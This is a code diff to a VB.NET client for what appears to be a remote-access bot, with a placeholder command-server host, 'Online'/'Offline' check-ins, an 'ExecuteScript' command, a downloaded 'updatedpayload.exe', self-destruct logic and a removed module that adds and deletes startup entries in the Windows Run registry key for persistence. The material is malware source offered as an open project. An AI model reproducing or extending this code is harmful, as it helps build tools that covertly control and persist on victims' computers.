@@ -24,7 +24,6 @@ Imports System.Security.Principal
 ' 
 ' This Project is Licensed under MIT
 ' -------------------------------
-
 Public Class Form1
     Public Host As String = "[HOST]"
     Public ID As String = "[ID]"
@@ -57,14 +56,6 @@ Public Class Form1
     Public TempPath As String = Path.GetTempPath
     Public LogsPath As String = TempPath & "\" & s & ".txt"
     Public C As HTTP = New HTTP
-    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
-        C.Send("Offline")
-        Application.Exit()
-    End Sub
-    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
-        C.Send("Offline")
-        Application.Exit()
-    End Sub
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Try
             If File.Exists(TempPath & "\updatedpayload.exe") Then
@@ -93,8 +84,6 @@ Public Class Form1
             C.ID = ID & "_" & HWD()
             C.Connect()
             C.Send("Online")
-
-
 
             If checkBlacklist() = True Then
                 C.Send("Uninstall")
@@ -332,7 +321,6 @@ Public Class Form1
                         DStartup(StartName)
                         Watchdog.StopWatcher(True)
                         SelfDestroy()
-                        Me.Close()
                         Application.Exit()
 
                     Case "ExecuteScript"
@@ -585,7 +573,7 @@ Public Class Form1
             Return ex.Message
         End Try
     End Function
-    Public Shared Function getMD5Hash(ByVal B As Byte()) As String
+    Public Function getMD5Hash(ByVal B As Byte()) As String
         B = New MD5CryptoServiceProvider().ComputeHash(B)
         Dim str2 As String = ""
         Dim num As Byte
@@ -730,17 +718,3 @@ re:
         Loop
     End Sub
 End Class
-Module Extra
-    Public Sub AStartup(ByVal Name As String, ByVal Path As String)
-        On Error Resume Next
-        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
-        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
-        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
-    End Sub
-    Public Sub DStartup(ByVal Name As String)
-        On Error Resume Next
-        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
-        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
-        Key.DeleteValue(Name)
-    End Sub
-End Module
